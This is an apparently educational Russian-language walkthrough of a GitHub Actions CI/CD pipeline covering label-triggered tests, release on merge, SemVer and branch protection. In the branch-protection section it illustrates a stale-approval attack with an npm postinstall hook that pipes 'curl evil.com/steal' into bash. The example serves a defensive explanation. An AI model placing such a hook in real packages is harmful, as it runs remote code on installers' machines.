# Полный разбор задания CI/CD Challenge — Часть 2
# Label-Driven Workflow + Release on Merge + Versioning + Constraints

> Формат: точная цитата → код → теория → альтернативы → что под капотом.

---

## БЛОК 3: LABEL-DRIVEN WORKFLOW

---

### «verify label: Triggers integration/E2E tests»

**Ключевой код:**
```yaml
on:
  pull_request:
    types: [labeled]
jobs:
  e2e-tests:
    if: github.event.label.name == 'verify'
```
```typescript
// e2e.test.ts — суть
const pkg = await import('../../dist/index.js');  // из СОБРАННОГО кода
expect(pkg.sum(10, 20)).toBe(30);
expect(existsSync('../../dist/index.d.ts')).toBe(true);
```

**Теория:**

**Что под капотом GitHub Event System:**

Когда ты вешаешь лейбл на PR, GitHub генерирует **Webhook event** — HTTP POST запрос на Actions Runner с JSON-объектом ~50 КБ:

```json
{
  "action": "labeled",
  "label": {
    "name": "verify",
    "color": "0E8A16"
  },
  "pull_request": {
    "number": 5,
    "head": { "sha": "a3b8c2f...", "ref": "feature/test" },
    "base": { "ref": "main" },
    "labels": [
      { "name": "verify" },
      { "name": "bug" }
    ]
  }
}
```

Runner получает этот JSON и:
1. Сканирует ВСЕ `.yml` файлы в `.github/workflows/`
2. Для каждого проверяет: `on.pull_request.types` содержит `"labeled"`?
3. Если да — запускает workflow. Условие `if:` проверяется уже ВНУТРИ запущенного workflow, на уровне job-а.

**Важный нюанс:** Если у тебя 3 workflow с `types: [labeled]`, все три ЗАПУСТЯТСЯ при любом лейбле. Но `if: github.event.label.name == 'verify'` внутри job-а отфильтрует — два из трёх увидят mismatch и пропустят выполнение (job будет "skipped", не "failed").

**Почему label-driven, а не другие подходы:**

| Подход | Как работает | Плюсы | Минусы |
|---|---|---|---|
| **Labels (наш)** | Ручное навешивание лейбла | Контролирует КОГДА запускать | Ручное действие |
| **Comment trigger** | `/e2e` в комментарии PR | Привычно для ChatOps | Нужен парсинг комментов |
| **Path-based** | E2E при изменении `src/` | Полностью автоматический | Нет контроля |
| **Manual dispatch** | Кнопка "Run workflow" | Максимальный контроль | Неудобно для PR-based flow |
| **Auto on all PRs** | E2E на каждый коммит | Точно не пропустишь | Дорого, медленно |

Labels — золотая середина: E2E не запускаются на каждый коммит (экономия), но разработчик точно контролирует момент запуска.

**Зачем E2E, когда Unit зелёные (глубже):**

Unit-тесты проверяют ИСХОДНИКИ. Но пользователь получает СКОМПИЛИРОВАННЫЙ пакет. Между исходниками и результатом стоит компилятор `tsc` с конфигом `tsconfig.json`. Ошибки между ними:

```
Проблема 1: Неправильный "module"
  tsconfig: "module": "CommonJS"
  package.json: "type": "module"
  → import {} from '...'  → ❌ ReferenceError: exports is not defined
  Юнит-тесты: ✅ (Vitest сам обрабатывает модули)

Проблема 2: Пропущенный export
  tsconfig: "isolatedModules": true может вызвать "re-export of type"
  → в dist/ пропадёт экспорт
  Юнит-тесты: ✅ (импортируют напрямую из src/)

Проблема 3: Неправильный "files" в package.json
  "files": ["lib"]  вместо ["dist"]
  → npm pack включит папку lib/ (которой нет)
  Юнит-тесты: ✅ (не зависят от npm pack)
```

E2E ловит все три случая, потому что тестирует конечный результат.

---

### «publish label: Generates RC / Blocks if version exists / Produces artifacts»

**Ключевой код (только суть):**
```yaml
# 1. Передача данных между шагами
- id: pkg
  run: |
    VERSION=$(node -p "require('./package.json').version")
    echo "version=${VERSION}" >> $GITHUB_OUTPUT

# 2. Блокировка по версии
- uses: emilmamedov-inno/cicd-shared-actions/check-version-exists@main
  id: version-check
- if: steps.version-check.outputs.exists == 'true'
  run: exit 1

# 3. Dev-суффикс
- run: |
    SHORT_SHA=$(echo "${{ github.event.pull_request.head.sha }}" | cut -c1-7)
    DEV_VERSION="${{ steps.pkg.outputs.version }}-dev-${SHORT_SHA}"
    npm version "${DEV_VERSION}" --no-git-tag-version

# 4. Артефакт
- run: npm pack
- uses: actions/upload-artifact@v4
  with: { name: npm-package, path: "*.tgz" }
```

**Теория:**

**Что под капотом `$GITHUB_OUTPUT`:**

До 2022 года GitHub Actions использовал `::set-output`. Его заменили на `$GITHUB_OUTPUT` по соображениям безопасности (инъекция через stdout):

```
Старый способ (deprecated, уязвимость injection):
  echo "::set-output name=version::1.0.0"
  ↑ Если версия содержала спецсимволы — код мог быть инъецирован

Новый способ (GITHUB_OUTPUT — файл):
  echo "version=1.0.0" >> $GITHUB_OUTPUT
  ↑ Записывается в файл, парсится безопасно
```

`$GITHUB_OUTPUT` — это переменная окружения, содержащая ПУТЬ к временному файлу (например `/home/runner/work/_temp/output_a1b2c3`). `>>` — APPEND. Runner после завершения шага читает этот файл и извлекает key-value пары.

**Что под капотом `npm pack`:**

```
npm pack выполняет:
1. Читает "files" из package.json → ["dist"]
2. Если .npmignore есть — применяет его как фильтр
3. ВСЕГДА включает: package.json, README.md, LICENSE
4. ВСЕГДА исключает: node_modules, .git, .github
5. Создаёт tar.gz архив: emilmamedov-inno-ts-math-utils-1.0.0.tgz
6. Архив = ТОЧНО то, что получит пользователь при npm install
```

Можно проверить содержимое: `npm pack --dry-run` покажет список файлов без создания архива.

**Что под капотом `upload-artifact`:**

```
1. Action вычисляет glob "*.tgz" → находит файл
2. Сжимает файл (если не уже .tgz) с помощью zlib
3. Отправляет на Actions Artifact Storage (Azure Blob)
4. Создаёт ссылку на странице workflow run
5. retention-days: 7 → через 7 дней автоудаление

Лимиты:
  - Максимум 500 МБ на артефакт
  - Максимум 10 ГБ на репозиторий (бесплатный plan)
  - Артефакт доступен ТОЛЬКО через UI/API, не через прямую ссылку
```

**Почему проверять версию ДО мерджа, а не при публикации:**

```
Сценарий БЕЗ ранней проверки:

  PR → merge → release.yml → npm publish → 403 "Version exists!" ❌
  
  Что имеем:
  ├── Код УЖЕ в main (мердж необратим без force push)
  ├── Пакет НЕ опубликован (npm отверг)
  ├── Тег НЕ создан (workflow упал раньше)
  └── "Половинчатый релиз" — требует ручного вмешательства

Сценарий С ранней проверкой (наш):

  PR → label "publish" → check-version → ❌ "Версия занята!"
  
  Что имеем:
  ├── Код НЕ в main (мердж заблокирован)
  ├── Разработчик видит: "bump version" → правит → зелёный
  └── Мердж → release → всё работает ✅

Сдвиг проверки ВЛЕВО (shift-left) — фундаментальный принцип CI/CD:
чем раньше поймаешь ошибку, тем дешевле её исправить.
```

---

## БЛОК 4: RELEASE ON MERGE

---

### «Automatically publish / Git tag / GitHub Release»

**Ключевой код:**
```yaml
on:
  pull_request:
    types: [closed]
jobs:
  release:
    if: github.event.pull_request.merged == true &&
        contains(github.event.pull_request.labels.*.name, 'publish')
```
```yaml
# Публикация
- run: |
    echo "//registry.npmjs.org/:_authToken=${NODE_AUTH_TOKEN}" > ~/.npmrc
    npm publish --access public
# Тег + релиз
- uses: emilmamedov-inno/cicd-shared-actions/create-release@main
```

**Теория:**

**Что под капотом `contains(github.event.pull_request.labels.*.name, 'publish')`:**

Это **выражение GitHub Actions** (не YAML, не Bash). Разберём:

```
github.event.pull_request.labels           → массив объектов [{name:"verify"}, {name:"publish"}]
github.event.pull_request.labels.*.name     → ["verify", "publish"]  (wildcard: все .name)
contains(["verify","publish"], 'publish')   → true
```

Оператор `.*` (star dereference) — фича GitHub Actions, не стандартный YAML. Превращает массив объектов в массив значений одного поля.

**Почему `types: [closed]`, а не отдельный event:**

GitHub API НЕ ИМЕЕТ события "merged". Merge — это closed + флаг merged:

```
PR закрыт без мерджа:
  event.action = "closed"
  event.pull_request.merged = false    ← Просто закрыли

PR смержен:
  event.action = "closed"
  event.pull_request.merged = true     ← Merge = закрытие + слияние кода

Поэтому нужна двойная проверка в if:
```

**Что под капотом Git Tag (`git tag -a`):**

Annotated tag — это полноценный Git-объект (как коммит), хранящийся в `.git/refs/tags/`:

```
Annotated tag object:
┌──────────────────────────────┐
│ object:  a3b8c2f...          │  ← SHA коммита, на который ссылается
│ type:    commit              │
│ tag:     v1.0.0              │
│ tagger:  github-actions[bot] │
│          2026-03-01T19:00:00 │
│ message: Release v1.0.0     │
└──────────────────────────────┘

Lightweight tag (без -a):
  Просто файл .git/refs/tags/v1.0.0 содержащий SHA.
  Нет автора, даты, сообщения.
```

Annotated tags — best practice для релизов. GPG-подпись тоже работает только с annotated.

**Что под капотом `gh release create --generate-notes`:**

1. `gh` находит ПРЕДЫДУЩИЙ тег (по SemVer: если создаём v1.1.0, предыдущий — v1.0.0)
2. Вычисляет `git log v1.0.0..v1.1.0` — все коммиты между тегами
3. Для каждого коммита ищет связанный PR (по SHA)
4. Формирует markdown:

```markdown
## What's Changed
* Add divide function by @emilmamedov-inno in #5
* Fix overflow in multiply by @contributor in #6

**Full Changelog**: https://github.com/.../compare/v1.0.0...v1.1.0
```

5. Создаёт Release через API с этим markdown как body

**`${{ secrets.GITHUB_TOKEN }}` — что под капотом:**

GITHUB_TOKEN — ephemeral token (живёт только пока workflow работает):

```
1. Workflow запускается
2. GitHub автоматически генерирует JWT с правами:
   - contents: write (читать/писать в репо — нужно для push tag)
   - pull-requests: read
   - ... (зависит от permissions: в workflow yml)
3. Токен инъецируется в env каждого шага
4. Workflow заканчивается → токен аннулируется

Это НЕ Personal Access Token — его не нужно хранить в Secrets.
Он создаётся и уничтожается автоматически для каждого запуска.
```

`NPM_TOKEN` — наоборот, ДОЛГОЖИВУЩИЙ. Его нужно создать на npmjs.com вручную и сохранить в GitHub Secrets. Он живёт, пока ты его не отзовёшь.

**Альтернативные подходы к релизу:**

| Подход | Как работает | Плюсы | Минусы |
|---|---|---|---|
| **Label on merge (наш)** | Лейбл `publish` + merge → release | Простой, явный контроль | Ручной лейбл |
| **Tag-based** | Push тега `v1.0.0` → release | Классический подход | Тег создаётся вручную |
| **Semantic Release** | Авто-версионирование по commit messages | Полностью автоматический | Сложный, требует конвенции коммитов |
| **Release Please** | Google-подход: PR с changelog | Автоматический changelog | Дополнительный PR на каждый релиз |
| **Manual dispatch** | Кнопка в UI | Максимальный контроль | Ручная работа |

Наш подход выбран для баланса: явный контроль (лейбл) + автоматизация (release на merge) + простота.

---

## БЛОК 5: VERSIONING

---

### «Use semantic versioning / Explicitly bumped / Version suffix»

**Ключевой код:**
```json
"version": "1.0.0"
```
```yaml
SHORT_SHA=$(echo "${{ github.event.pull_request.head.sha }}" | cut -c1-7)
DEV_VERSION="${{ steps.pkg.outputs.version }}-dev-${SHORT_SHA}"
npm version "${DEV_VERSION}" --no-git-tag-version
```

**Теория:**

**SemVer — полная спецификация (semver.org):**

```
MAJOR.MINOR.PATCH[-prerelease][+build]

Примеры валидных версий:
  1.0.0
  1.0.0-alpha
  1.0.0-alpha.1
  1.0.0-dev-a3b8c2f        ← наш формат
  1.0.0-beta.2+build.456   ← с build metadata

Порядок сравнения (от младшей к старшей):
  1.0.0-alpha < 1.0.0-alpha.1 < 1.0.0-beta < 1.0.0-dev-a3b < 1.0.0
  ↑                                                              ↑
  Prerelease ВСЕГДА меньше                   Финальная (без суффикса)
```

Что это означает для `npm install`:
```
package.json:  "@emilmamedov-inno/ts-math-utils": "^1.0.0"

npm install → поставит 1.0.0 (стабильный)
              НЕ поставит 1.0.1-dev-a3b8c2f (prerelease)

npm install @emilmamedov-inno/ts-math-utils@1.0.1-dev-a3b8c2f
              → поставит КОНКРЕТНО эту prerelease (явный запрос)
```

Prerelease НИКОГДА не установится автоматически. Это гарантия безопасности для пользователей.

**`npm version` — что под капотом:**

```
npm version "1.1.0-dev-a3b8c2f" --no-git-tag-version

Что делает:
  1. Валидирует: строка — валидный SemVer? ✅
  2. Открывает package.json
  3. Меняет "version": "1.0.0" → "version": "1.1.0-dev-a3b8c2f"
  4. Сохраняет

Без --no-git-tag-version:
  5. git commit -m "1.1.0-dev-a3b8c2f"
  6. git tag v1.1.0-dev-a3b8c2f

С --no-git-tag-version:
  НЕ делает commit и tag (нам не нужен тег для RC)
```

**Почему EXPLICIT bump, а не AUTOMATIC:**

Automatic versioning (Semantic Release) определяет тип bump из commit messages:
```
fix: correct sum overflow     → PATCH (1.0.0 → 1.0.1)
feat: add divide function     → MINOR (1.0.0 → 1.1.0)
feat!: rename sum to add      → MAJOR (1.0.0 → 2.0.0)
```

Это требует **Conventional Commits** — строгого формата сообщений. Наше задание требует explicit bump, потому что:
1. Проще для понимания (нет магии)
2. Разработчик ТОЧНО знает, какую версию ставит
3. Нет зависимости от формата commit messages (а люди пишут их по-разному)
4. В package.json видно diff: `"version": "1.0.0"` → `"version": "1.1.0"` — ревьюер видит версию прямо в PR

---

## БЛОК 6: CONSTRAINTS

---

### «Automate branch protection setup»

**Ключевой код (JSON, отправленный через `gh api`):**
```json
{
  "required_status_checks": { "strict": true, "contexts": ["Verify Pull Request"] },
  "required_pull_request_reviews": { "required_approving_review_count": 1, "dismiss_stale_reviews": true },
  "restrictions": null,
  "required_linear_history": true,
  "allow_force_pushes": false,
  "allow_deletions": false
}
```

**Теория:**

**Что под капотом GitHub REST API:**

```
gh api --method PUT "/repos/owner/repo/branches/main/protection" --input file.json

Под капотом gh:
  1. Читает токен из ~/.config/gh/hosts.yml
  2. Формирует HTTP запрос:
     PUT https://api.github.com/repos/owner/repo/branches/main/protection
     Authorization: Bearer ghp_xxx...
     Content-Type: application/json
     Body: { ... }
  3. GitHub сервер:
     - Проверяет токен (есть ли права на admin:repo)
     - Валидирует JSON
     - Обновляет Branch Protection Rules в базе данных
     - Возвращает 200 OK + обновлённое состояние
```

**Альтернативы автоматизации Branch Protection:**

| Подход | Технология | Плюсы | Минусы |
|---|---|---|---|
| **gh api (наш)** | GitHub CLI | Простой, понятный | Императивный (надо запускать) |
| **Terraform** | HCL + github provider | Декларативный, state mgmt | Нужен Terraform, state backend |
| **Pulumi** | TypeScript/Python + github provider | Декларативный, привычные языки | Сложная настройка |
| **GitHub Org Rulesets** | GitHub UI/API | Применяются ко ВСЕМ репо в org | Только для организаций (не для personal repos) |
| **probot** | Node.js bot | Реагирует на события в реалтайме | Нужен хостинг для бота |

Terraform-подход (Infrastructure as Code) для крупных компаний:
```hcl
resource "github_branch_protection" "main" {
  repository_id = github_repository.main.id
  pattern       = "main"
  
  required_status_checks {
    strict   = true
    contexts = ["Verify Pull Request"]
  }
  
  required_pull_request_reviews {
    required_approving_review_count = 1
    dismiss_stale_reviews           = true
  }
  
  required_linear_history = true
}
```

Terraform хранит **state** (текущее состояние) и при `terraform apply` вычисляет diff между желаемым и фактическим. Для одного репо — overkill. Для 50 репозиториев — необходимость.

**`dismiss_stale_reviews` — атака без этого флага:**

```
Атака "тихий коммит":

1. Разработчик: открывает PR с невинным кодом
2. Ревьюер: смотрит код, одобряет ✅
3. Разработчик: pushит ещё один коммит с вредоносным кодом:
   "postinstall": "curl evil.com/steal | bash"
4. БЕЗ dismiss_stale_reviews:
   Старый аппрув ДЕЙСТВУЕТ ✅ → разработчик мержит → вредоносный код в main
5. С dismiss_stale_reviews:
   Новый push СБРАСЫВАЕТ аппрув ❌ → ревьюер должен ЗАНОВО смотреть код
```

Это реальный вектор атаки, особенно в open source с внешними контрибуторами.

---

### «No manual steps allowed after PR approval»

**Ключевой код:**
```yaml
if: github.event.pull_request.merged == true &&
    contains(github.event.pull_request.labels.*.name, 'publish')
```

**Теория:**

Это принцип **Continuous Deployment (CD)** — высший уровень автоматизации:

```
CI/CD спектр:

Continuous Integration (CI):
  Каждый push → автоматически: lint, build, test
  "Код всегда собирается и тестируется"
  (мы делаем это в pr-checks.yml)

Continuous Delivery:
  CI + автоматическая ПОДГОТОВКА к релизу
  Но сам деплой/публикация — по кнопке
  "Можно зарелизить в любой момент, но ручное решение"
  (мы делаем это в label-publish.yml: артефакт ДО мерджа)

Continuous Deployment:
  CI + автоматический релиз после merge
  НОЛЬ ручных шагов после approval
  "Каждый мердж — автоматически в продакшен"
  (мы делаем это в release.yml)
```

Наш пайплайн реализует ВСЕ ТРИ уровня одновременно:
- CI → `pr-checks.yml`
- Continuous Delivery → `label-publish.yml` (артефакт)
- Continuous Deployment → `release.yml` (авто-публикация)

---

### «Reusable actions in another generic repo»

**Ключевой код:**
```yaml
uses: emilmamedov-inno/cicd-shared-actions/setup-node-deps@main
```

**Теория:**

**Что под капотом `uses: owner/repo/path@ref`:**

```
Runner видит: uses: emilmamedov-inno/cicd-shared-actions/setup-node-deps@main

1. Проверяет локальный кэш: есть ли этот action?
2. Если нет → git clone --depth 1 --branch main \
     https://github.com/emilmamedov-inno/cicd-shared-actions.git \
     /home/runner/work/_actions/emilmamedov-inno/cicd-shared-actions/main
3. Читает /setup-node-deps/action.yml
4. Тип: composite
5. "Разворачивает" steps этого action в текущий workflow
6. Каждый step выполняется так, будто он написан в основном yml
7. Inputs подставляются через ${{ inputs.node-version }}
```

**Версионирование actions (`@main` vs `@v1` vs `@SHA`):**

```
@main                                   Всегда последний коммит.
  Плюс: автоматические обновления
  Минус: может сломаться в любой момент (breaking change)

@v1                                     Тег. Семантическое версионирование.
  Плюс: стабильно, обновляется осознанно
  Минус: нужно поддерживать теги

@a3b8c2f4d5e6f7a8b9c0d1e2f3a4b5c6d7e8f9a0  Конкретный SHA.
  Плюс: МАКСИМАЛЬНО стабильно (никто не может подменить)
  Минус: нечитаемо, ручное обновление

Рекомендация GitHub для SECURITY-КРИТИЧНЫХ actions:
  uses: actions/checkout@11bd71901bbe5b1630ceea73d27597364c9af683  # v4.2.2
  (SHA + комментарий с версией для читаемости)
```

Мы используем `@main` для простоты учебного проекта. В продакшене — `@v1` или SHA.

**Критерий "что выносить":**

```
Вопрос: "Могу ли я этот кусок кода использовать в ДРУГОМ проекте без изменений?"

setup-node-deps:       "Установить Node + npm ci"          → ДА, generic
check-version-exists:  "Проверить версию в npm"             → ДА, generic
create-release:        "Создать тег и GitHub Release"       → ДА, generic
"Run lint":            "npm run lint" (1 строка)            → НЕТ, слишком примитивно
"Check lockfile":      Специфичная проверка (if ! -f ...)   → НЕТ, слишком специфично
```

Правило: если логика больше 3-5 строк И переиспользуема — выноси. Если это одна строка `run: npm test` — не стоит.
